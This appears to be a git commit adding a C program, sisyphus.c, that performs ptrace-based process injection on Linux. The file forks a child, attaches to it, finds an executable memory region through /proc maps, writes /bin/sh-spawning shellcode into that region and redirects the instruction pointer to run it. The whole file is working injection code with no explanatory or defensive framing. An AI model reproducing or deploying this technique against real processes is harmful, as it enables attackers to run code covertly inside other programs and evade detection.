1f33abdbae90e7effebbc15a91577c608de514f6
skelly <skelly@skell.com>
2024-04-10 19:47:06 +0300

    Added sisyphus.c

---
+++ sisyphus.c
@@ -0,0 +1,107 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <stdint.h>
+
+ 
+
+const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96" //this is /bin/sh in shellcode.
+                        "\x91\xd0\x8c\x97\xff\x48\xf7"
+                        "\xdb\x53\x54\x5f\x99\x52\x57"
+                        "\x54\x5e\xb0\x3b\x0f\x05";
+
+void inject(pid_t pid) {
+    struct user_regs_struct old_regs, regs;
+    long address;
+    size_t psize = strlen(SHELLCODE);
+
+    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+        perror("Failed to attach to process.");
+        exit(EXIT_FAILURE);
+    }
+
+    wait(NULL);
+
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &old_regs) < 0) {
+        perror("Failed to get state from registers.");
+        exit(EXIT_FAILURE);
+    }
+
+    char maps[20];
+    snprintf(maps, sizeof(maps), "/proc/%d/maps", pid);
+    FILE *file_maps = fopen(maps, "r");
+    if (!file_maps) {
+        perror("Failed to open maps file.");
+        exit(EXIT_FAILURE);
+    }
+
+    char line[256];
+    while (fgets(line, sizeof(line), file_maps)) {
+        if (strstr(line, "r-xp") != NULL) {
+            address = strtol(strtok(line, "-"), NULL, 16);
+            break;
+        }
+    }
+    fclose(file_maps);
+
+    if (address == 0) {
+        fprintf(stderr, "Failed to find a suitable memory region for injection.\n");
+        exit(EXIT_FAILURE);
+    }
+    printf("[*] Found suitable memory region at %ld\n", address);
+    for (size_t i = 0; i < psize; i += sizeof(uint64_t)) {
+        uint64_t value = *(uint64_t *)(SHELLCODE + i);
+        if (ptrace(PTRACE_POKEDATA, pid, address + i, (void *)value) < 0) {
+            perror("Failed to write data to process memory.");
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
+    regs.rip = address;
+
+    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
+        perror("Failed to set registers state.");
+        exit(EXIT_FAILURE);
+    }
+
+    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
+        perror("Failed to detach from process.");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("[*] Injected!!\n");
+}
+
+int main() {
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("[!] fork() fail");
+        exit(1);
+    } else if (pid == 0) {
+        printf("[*] CHILD: In child proc with PID: %i\n", pid);
+        
+        pid_t cpid = setsid();
+        if (cpid < 0) {
+            perror("[!] setsid() fail\n");
+            exit(1);
+        } 
+        
+        printf("[*] CHILD: Dettached from PARENT\n");
+        printf("[*] CHILD: Entering sleep\n");
+        
+        while (1) {
+            sleep(1);
+            printf("[*] CHILD: Sleeping\n");
+        }
+
+    } else {
+        printf("[*] PARENT: Starting injection\n");
+        inject(pid);
+    }
+    return 0;
+}
